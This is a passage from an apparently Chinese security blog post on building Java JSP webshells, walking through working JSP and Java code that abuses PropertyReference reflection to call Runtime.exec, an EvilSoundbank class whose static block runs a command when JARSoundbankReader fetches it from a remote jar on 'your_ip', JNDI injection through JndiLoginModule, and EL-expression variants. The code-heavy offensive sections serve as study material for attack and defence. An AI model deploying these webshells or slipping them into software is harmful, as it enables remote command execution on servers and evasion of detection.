+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field, java.lang.reflect.Method&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.javafx.property.PropertyReference&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="comment">// 创建 PropertyReference 对象  </span></span><br><span class="line">    <span class="type">PropertyReference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertyReference</span>(String.class, <span class="string">&quot;test&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取并修改 reflected 字段  </span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reflectedField</span> <span class="operator">=</span> PropertyReference.class.getDeclaredField(<span class="string">&quot;reflected&quot;</span>);  </span><br><span class="line">    reflectedField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    reflectedField.set(reference, <span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取 Runtime.exec 方法  </span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> Runtime.class.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String[].class);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 获取并修改 setter 字段  </span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">setterField</span> <span class="operator">=</span> PropertyReference.class.getDeclaredField(<span class="string">&quot;setter&quot;</span>);  </span><br><span class="line">    setterField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    setterField.set(reference, execMethod); <span class="comment">// 将 exec 方法注入到 setter  </span></span><br><span class="line">    <span class="comment">// 执行恶意命令  </span></span><br><span class="line">    String[] command = &#123;<span class="string">&quot;calc&quot;</span>&#125;;  </span><br><span class="line">    reference.set(Runtime.getRuntime(), command); <span class="comment">// 触发恶意方法执行  </span></span><br><span class="line">  </span><br><span class="line">%&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改reflected字段可以让我们在reflect方法中绕过赋值getter和setter属性的逻辑，不过如果目标类没有Setter方法，那也不会有什么影响。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250421034145261.png"></p>
+<h3 id="JARSoundbankReader"><a href="#JARSoundbankReader" class="headerlink" title="JARSoundbankReader"></a>JARSoundbankReader</h3><h4 id="前置知识-SPI机制"><a href="#前置知识-SPI机制" class="headerlink" title="前置知识-SPI机制"></a>前置知识-SPI机制</h4><p>SPI，即Service Provider Interface，是Java提供的一套用来被第三方实现或扩展的API。它可以用于模块化，提供统一的接口，并且加载实现这些接口的类。</p>
+<p>SPI的工作原理很简单。在你的JAR包中，可以包含一个名为<code>META-INF/services</code>的文件夹，里面包含一些配置文件。这些配置文件的命名应该和接口全名一致，而文件的内容则是该接口的具体实现类。当运行到程序需要用到这个接口的时候，Java会扫描所有包含这个接口的实现类的配置文件，加载实现类。</p>
+<p>一个典型的SPI的使用是在<code>java.util.ServiceLoader</code>。ServiceLoader是一种服务提供加载设施，它可以加载Service接口的实现。当你调用<code>ServiceLoader.load()</code>方法时，它会返回一个实现了该接口的对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ServiceLoader&lt;YourInterface&gt; loaders = ServiceLoader.load(YourInterface.class);  </span><br><span class="line"><span class="keyword">for</span> (YourInterface loader : loaders) &#123;  </span><br><span class="line">    <span class="comment">// do something with loader  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样，你就可以在代码中调用SPI的接口，而具体的实现可以在运行时动态添加。这种机制让代码可以更加模块化，更容易扩展。</p>
+<p>Java的许多核心API都使用SPI，例如<code>java.sql.Driver</code>或<code>javax.servlet.ServletContainerInitializer</code>等。可以通过实现这些接口，为Java添加新的数据库驱动或者Servlet容器。</p>
+<h6 id="mysql-connector-java中的SPI"><a href="#mysql-connector-java中的SPI" class="headerlink" title="mysql-connector-java中的SPI"></a>mysql-connector-java中的SPI</h6><p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250424162652533.png"></p>
+<p>程序会通过 <code>java.util.ServiceLoder</code> 动态装载实现模块，在 <code>META-INF/services</code> 目录下的配置文件寻找实现类的类名，通过 <code>Class.forName</code> 加载进来， <code>newInstance()</code> 反射创建对象。</p>
+<h4 id="制作WebShell"><a href="#制作WebShell" class="headerlink" title="制作WebShell"></a>制作WebShell</h4><p><code>JARSoundbankReader#getSoundbank</code>实现了Java SPI机制，用于从JAR文件中发现和加载Soundbank实现。代码如下：</p>
+<p>首先是判断是否是压缩包，而jar包的本质也是压缩包，因此是可以通过判断的。然后尝试从JAR的META-INF&#x2F;services目录下读取Soundbank服务描述文件，即代码中的<code>META-INF/services/javax.sound.midi.Soundbank</code>，接着会去加载服务描述文件中指定的类，并创建该类的实例。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Soundbank <span class="title function_">getSoundbank</span><span class="params">(URL var1)</span> <span class="keyword">throws</span> InvalidMidiDataException, IOException &#123;  </span><br><span class="line">    <span class="keyword">if</span> (!isZIP(var1)) &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="type">ArrayList</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();  </span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">var3</span> <span class="operator">=</span> URLClassLoader.newInstance(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;var1&#125;);  </span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">var4</span> <span class="operator">=</span> var3.getResourceAsStream(<span class="string">&quot;META-INF/services/javax.sound.midi.Soundbank&quot;</span>);  </span><br><span class="line">        <span class="keyword">if</span> (var4 == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(var4));  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">for</span>(<span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> var5.readLine(); var6 != <span class="literal">null</span>; var6 = var5.readLine()) &#123;  </span><br><span class="line">                    <span class="keyword">if</span> (!var6.startsWith(<span class="string">&quot;#&quot;</span>)) &#123;  </span><br><span class="line">                        <span class="keyword">try</span> &#123;  </span><br><span class="line">                            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> Class.forName(var6.trim(), <span class="literal">false</span>, var3);  </span><br><span class="line">                            <span class="keyword">if</span> (Soundbank.class.isAssignableFrom(var7)) &#123;  </span><br><span class="line">                                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> ReflectUtil.newInstance(var7);  </span><br><span class="line">                                ......</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样我们的思路就很简单了，构造一个Soundbank的实现类，在静态代码块写入命令执行以便于实例化时自动触发。然后在<code>META-INF/services/javax.sound.midi.Soundbank</code>写入这个类即可。</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250425103541874.png"></p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250425103633666.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilSoundbank</span> <span class="keyword">implements</span> <span class="title class_">Soundbank</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getVersion</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">	......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打成jar包后，放在http服务器上，然后用下面代码请求。就会触发命令了。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.media.sound.JARSoundbankReader&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="type">JARSoundbankReader</span> <span class="variable">jarSoundbankReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JARSoundbankReader</span>();  </span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://your_ip/JARSoundbankReader_SPI.jar&quot;</span>);  </span><br><span class="line">    jarSoundbankReader.getSoundbank(url);  </span><br><span class="line">    out.println(<span class="string">&quot;success&quot;</span>);  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250425103937081.png"></p>
+<h3 id="JndiLoginModule"><a href="#JndiLoginModule" class="headerlink" title="JndiLoginModule"></a>JndiLoginModule</h3><p>对tomcat的版本有要求，我在9.0.24和9.0.36均可以成功。无需多言的jndi注入了。可以自行调试和对版本进行试验。</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.security.auth.module.JndiLoginModule&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.realm.JAASRealm&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;  </span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.realm.JAASCallbackHandler&quot;</span> %&gt;  </span><br><span class="line">&lt;%  </span><br><span class="line">    <span class="type">String</span> <span class="variable">provider</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:50389/746c78&quot;</span>;  </span><br><span class="line">    <span class="type">JndiLoginModule</span> <span class="variable">module</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JndiLoginModule</span>();  </span><br><span class="line">    Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">    map.put(<span class="keyword">module</span>.USER_PROVIDER, provider);  </span><br><span class="line">    map.put(<span class="keyword">module</span>.GROUP_PROVIDER, <span class="string">&quot;group&quot;</span>);  </span><br><span class="line">    <span class="type">JAASRealm</span> <span class="variable">realm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JAASRealm</span>();  </span><br><span class="line">    realm.setContainer(<span class="keyword">new</span> <span class="title class_">StandardContext</span>());  </span><br><span class="line">    <span class="keyword">module</span>.initialize(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">JAASCallbackHandler</span>(realm, <span class="string">&quot;user&quot;</span>,  </span><br><span class="line">            <span class="string">&quot;pass&quot;</span>), <span class="literal">null</span>, map);  </span><br><span class="line">    <span class="keyword">module</span>.login();  </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="表达式篇"><a href="#表达式篇" class="headerlink" title="表达式篇"></a>表达式篇</h2><p>jsp还支持用表达式。比如：</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250512130823744.png"></p>
+<p>在tomcat解析的时候，${‘’.getClass()} 和 ${‘’[‘getClass’]()}其实是等价的。因此可以将上面的代码转换成下面的：</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250512131559084.png"></p>
+<p>第一种会用AstDotSuffix去表示方法名称，第二种用AstBracketSuffix表示方法名称。刚兴趣可以自行从ExpressionBuilder类跟进调试。</p>
+<table>
+<thead>
+<tr>
+<th>类名</th>
+<th>作用场景</th>
+<th>典型语法示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>AstDotSuffix</strong></td>
+<td>处理 <strong>点号运算符</strong>（<code>.</code>）的属性访问或方法调用，例如 EL 表达式中的 <code>obj.property</code></td>
+<td><code>$&#123;user.name&#125;</code> 或 <code>user.getName()</code></td>
+</tr>
+<tr>
+<td><strong>AstBracketSuffix</strong></td>
+<td>处理 <strong>括号后缀</strong>（<code>[]</code>）的代码块</td>
+<td><code>$&#123;[getName]&#125;</code></td>
+</tr>
+</tbody></table>
+<p>如果结合param获取参数，可以变成如下：</p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250512133957963.png"></p>
+<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250512133939855.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E8%A7%A3%E6%9E%90%E7%AF%87%E2%80%94%E2%80%94%E7%BC%96%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">Tomcat解析篇——编码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell"><span class="toc-number">2.1.</span> <span class="toc-text">WebShell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UTF-16BE%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.1.</span> <span class="toc-text">UTF-16BE编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UTF-8-UTF-16BE-%E5%8F%8C%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.2.</span> <span class="toc-text">UTF-8 + UTF-16BE 双编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#utf-16-cp037%E5%8F%8C%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.3.</span> <span class="toc-text">utf-16 + cp037双编码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E7%BC%96%E7%A0%81"><span class="toc-number">2.1.4.</span> <span class="toc-text">三编码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat%E8%A7%A3%E6%9E%90%E7%AF%87%E2%80%94%E2%80%94%E6%A0%87%E7%AD%BE"><span class="toc-number">3.</span> <span class="toc-text">Tomcat解析篇——标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E7%B1%BB%E7%AF%87"><span class="toc-number">4.</span> <span class="toc-text">危险类篇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.</span> <span class="toc-text">反射方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%B1%9E%E6%80%A7"><span class="toc-number">4.2.</span> <span class="toc-text">反射属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JARSoundbankReader"><span class="toc-number">4.3.</span> <span class="toc-text">JARSoundbankReader</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-SPI%E6%9C%BA%E5%88%B6"><span class="toc-number">4.3.1.</span> <span class="toc-text">前置知识-SPI机制</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#mysql-connector-java%E4%B8%AD%E7%9A%84SPI"><span class="toc-number">4.3.1.0.1.</span> <span class="toc-text">mysql-connector-java中的SPI</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%B6%E4%BD%9CWebShell"><span class="toc-number">4.3.2.</span> <span class="toc-text">制作WebShell</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JndiLoginModule"><span class="toc-number">4.4.</span> <span class="toc-text">JndiLoginModule</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AF%87"><span class="toc-number">5.</span> <span class="toc-text">表达式篇</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&text=Java-WebShell攻防学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&title=Java-WebShell攻防学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&is_video=false&description=Java-WebShell攻防学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java-WebShell攻防学习&body=Check out this article: http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&title=Java-WebShell攻防学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&title=Java-WebShell攻防学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&title=Java-WebShell攻防学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&title=Java-WebShell攻防学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&name=Java-WebShell攻防学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/05/12/Java-WebShell%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/&t=Java-WebShell攻防学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2016-2025
+        John Doe
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">首页</a></li><!--
+        --><!--
+          --><li><a href="/about/">关于</a></li><!--
+        --><!--
+          --><li><a href="/archives/">归档</a></li><!--
+        --><!--
+          --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
